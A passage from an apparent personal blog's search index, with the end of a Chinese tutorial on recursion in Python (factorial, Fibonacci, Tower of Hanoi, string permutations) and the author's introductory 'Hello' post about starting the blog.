class="hljs-number">5</span>-<span class="hljs-number">2</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">3</span>)*f(<span class="hljs-number">5</span>-<span class="hljs-number">4</span>))))<span class="hljs-comment">#上半部分为递，下半部分为归</span><br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">2</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">3</span>)*<span class="hljs-number">1</span>)))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">2</span>)*(<span class="hljs-number">2</span>))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">6</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">24</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><p>则可以得出最终程序，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n*f(n-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h4 id="举例2：斐波那契数列"><a href="#举例2：斐波那契数列" class="headerlink" title="举例2：斐波那契数列"></a>举例2：斐波那契数列</h4><p>1、1、2、3、5、8、13、21、34·······  简单点说就是第n项的值为前两项之和</p><p>首先对该数列进行分析，由于第一项和第二项没有前两项，则可以知道其值直接为1，假设f(n)为第n项的值，则可以推出下式：</p><p><img src="/2022/01/22/recursion/2.png" alt="img"></p><p>先确定函数的参数、返回值，求第n项的值，则n毫无疑问是参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">return</span> s <span class="hljs-comment"># 假设s是第n项的值</span><br></code></pre></td></tr></table></figure><p>确定终止条件，已知n=1或者n=2时，其值为1，则可以确定当n=1或者n=2时递归就可以结束了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(n==<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s<span class="hljs-comment"># 假设s是第n项的值</span><br></code></pre></td></tr></table></figure><p>确定单层函数的逻辑，先假设n=3，则第三项的值<code>f(3)=f(2)+f(1)</code>，也就相当于<code>f(n)=f(n-1)+f(n-2)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(n==<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> f(n-<span class="hljs-number">1</span>)+f(n-<span class="hljs-number">2</span>)<span class="hljs-comment"># 完工</span><br></code></pre></td></tr></table></figure><h4 id="举例-3-汉诺塔"><a href="#举例-3-汉诺塔" class="headerlink" title="举例 3 汉诺塔"></a>举例 3 汉诺塔</h4><p>求汉诺塔的挪动顺序(不是需要挪动的次数)</p><p>具体玩法这就不啰嗦了，反正就是把一堆圆片片从一个柱子上面挪到另外一个柱子上面，唯一的要求就是小的要在大的上面。</p><p>假设圆片片的数量为n,则当n=1时，可以直接将A移动到C柱上，</p><p><img src="/2022/01/22/recursion/tower1.gif"></p><p>当n=2时，具体挪动状态如下:</p><p>A –&gt; B</p><p>A –&gt; C</p><p>B –&gt; C</p><p><img src="/2022/01/22/recursion/tower2.gif"></p><p>当n=3时</p><p>A –&gt; C</p><p>A –&gt; B</p><p>C –&gt; B</p><p>A –&gt; C</p><p>B –&gt; A</p><p>B –&gt; C</p><p>A –&gt; C</p><p><img src="/2022/01/22/recursion/tower3.gif"></p><p>不难看出，当n=2时，主要就是分三步(对圆片进行标号，从下往上，N-&gt;1)</p><p>1、1(N-1)号圆片从起始位置移动到缓冲区</p><p>2、将2(N)号圆片从起始位置移动到终点</p><p>3、最后将1(N-1)号圆片从缓冲区移动到终点</p><p>当然，在圆片数量较多时的起始位置，终点与缓冲区是相对的，并不是指定的某一个柱子，因为需要不停的交换位置，所以起始位置、缓冲区与终点可以是任何一个柱子。</p><p>先假设只有两个圆片，也就是n=2(要先将最小子问题求出)按照递归三步，首先确定参数以及返回值，n个圆片(n)，起始柱子(A)，缓冲柱子(B)，终止位置(C)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;圆片的变动情况&quot;</span>)<br></code></pre></td></tr></table></figure><p>确定终止条件，已知当只有一个圆片时，可以直接从起始位置直接到终止位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;圆片的变动情况&quot;</span>)<br></code></pre></td></tr></table></figure><p>确定单层循环的逻辑，单层的逻辑在上面已经写清楚，所以可以直接写出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># n = 2的情况下</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+B)<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>        <span class="hljs-built_in">print</span>(B +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br></code></pre></td></tr></table></figure><p>而当n=3时，就要继续调用tower()进行排列，所以可以写成如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 再假设n = 3的情况下</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        tower(n-<span class="hljs-number">1</span>,A,C,B) <span class="hljs-comment">#因为现在是将圆片从A移动到B，所以B和C调换位置</span><br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<span class="hljs-comment"># 可以假设1号圆片上面的柱子都已经移动到了缓冲区，则可以直接A-&gt;C</span><br>        tower(n-<span class="hljs-number">1</span>,B,A,C) <span class="hljs-comment"># 现在将缓冲区上的圆片移动至终点</span><br></code></pre></td></tr></table></figure><p>n&gt;1的其他情况同理</p><h4 id="举例4-字符串的全排列"><a href="#举例4-字符串的全排列" class="headerlink" title="举例4 字符串的全排列"></a>举例4 字符串的全排列</h4><p>就是将字符串中的所有字符进行排列组合，得到所有的排列组合结果，并去重</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 例题</span><br><span class="hljs-comment"># 题目来源：codewars.Permutations</span><br>permutations(<span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment"># [&#x27;a&#x27;]</span><br>permutations(<span class="hljs-string">&#x27;ab&#x27;</span>); <span class="hljs-comment"># [&#x27;ab&#x27;, &#x27;ba&#x27;]</span><br>permutations(<span class="hljs-string">&#x27;aabb&#x27;</span>); <span class="hljs-comment"># [&#x27;aabb&#x27;, &#x27;abab&#x27;, &#x27;abba&#x27;, &#x27;baab&#x27;, &#x27;baba&#x27;, &#x27;bbaa&#x27;]</span><br></code></pre></td></tr></table></figure><p>题目的意思很好理解，所以可以直接上递归</p><p>确定递归的参数及返回值，是对字符串的全排列，所以字符串一定是参数，返回值则是排列组合的结果，并且要去重，则可以用一个数组在加上set()去重即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># 存放排列组合的结果</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>确定递归的结束点，由例子可知，当字符串中只有一个字母时，结果只有一个(它自己本身)，此时可以直接返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># 存放排列组合的结果</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>确定单层递归逻辑，可以先假设字符串为”ab”,这个算是全排列中最小子问题了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 字符串长度为2时</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># 存放排列组合的结果</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string[:i]+string[i+<span class="hljs-number">1</span>:]: <span class="hljs-comment"># 全排列的情况下,不能与自身进行排列组合</span><br>            <span class="hljs-comment"># 也就是说，在&quot;ab&quot;的情况下，选取&quot;a&quot;之后就不能再选取了，当然&quot;aab&quot;的情况下，a可以出现两次</span><br>            result.append(string[i]+j)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>而当字符串的长度大于2时，只需要在第二个for循环处再次调用<code>permutations()</code>,使得其对当前字符串长度小移位的字符串进行排列组合，然后返回给 j ，再与<code>string[i]</code>进行拼接，所以程序可以写成如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = []<span class="hljs-comment"># 存放排列组合的结果</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> permutations(string[<span class="hljs-number">0</span>:i]+string[i+<span class="hljs-number">1</span>:]):<br>                result.append(string[i]+j)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><h3 id="End"><a href="#End" class="headerlink" title="End"></a>End</h3><p>本文可能会有写错的地方，请见谅，我只是个捡垃圾，要是有好心的大哥愿意指出错误的地方，我会尽快进行修改，先感谢大哥~</p><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/94748605">https://zhuanlan.zhihu.com/p/94748605</a></p><p><a href="https://www.zhihu.com/question/24385418">https://www.zhihu.com/question/24385418</a></p><p><a href="https://blog.csdn.net/u011562123/article/details/81984470">https://blog.csdn.net/u011562123/article/details/81984470</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>学习递归的一些记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello</title>
    <link href="/2022/01/20/hello/"/>
    <url>/2022/01/20/hello/</url>
    
    <content type="html"><![CDATA[<p>按照惯例，博客第一篇文章总要说讲一些奇奇怪怪的话</p><p>很早之前就有搭建博客的想法，也试过，但主要是苦于没有什么文章可发，现在想想其实是学到了什么就发什么，写的好不好其实也不是那么重要，当然，能写好的博客是最好的啦。这次搭建博客可能也是一时兴起，但希望我以后能够坚持下去，在此也立个<code>flag</code> : <strong>每周更新一篇博客</strong></p><p>搭博客是用的<code>github</code>+<code>hexo</code>，两个原因，一个没票子，另一个图省事，说白了就是又懒又想白嫖(开源精神)</p><p>学安全也断断续续的很长时间了，总是玩着玩着学一点点的，到头来一事无成，找个工作都很费劲，如果有人看到了，还请激励自己要坚持下去，玩很重要，但学习更重要。假如当初好好学习，现在也不至于混到去捡垃圾，但是没有假如，没有假如！没什么是能够不劳而获的，当然，要是特殊情况另算，对于像我这样的普通人来说，想要获得，就要付出，可能付出很多却只能收获一点点，但总比没有强哈。说实话，安全这个我很怕以后会吃不上饭，30岁之后吧，担心会吃不上饭。捡垃圾的我技术很垃圾，口才也不行，为人处世也一般般，感觉自己混不成领导，所以就很怕很怕。当然吃不上饭可能有点夸张，但确实是有一定可能的。</p><p>其实搭建博客也有好处，简单点说，把自己理解或者学习的东西表达出来，这在我看来是比自己学的更难一些，但是在写博客的过程中，会发现自己以前似懂非懂的地方可能会逐渐清晰(这也是我这几天在写下一篇博客时的体会)。</p><p>扯了一些废话，也能看，也不能看，水一下，顺道测试一下博客能不能用！</p><p>如果你看到了这些废话，并且看看也无妨，但请别喷我，谢谢啦~</p><p>最后再附张图片吧，也附上一句台词</p><blockquote><p>刈除杂草 才有新生</p></blockquote><p><img src="/2022/01/20/hello/hello.jfif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>一些废话吧</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
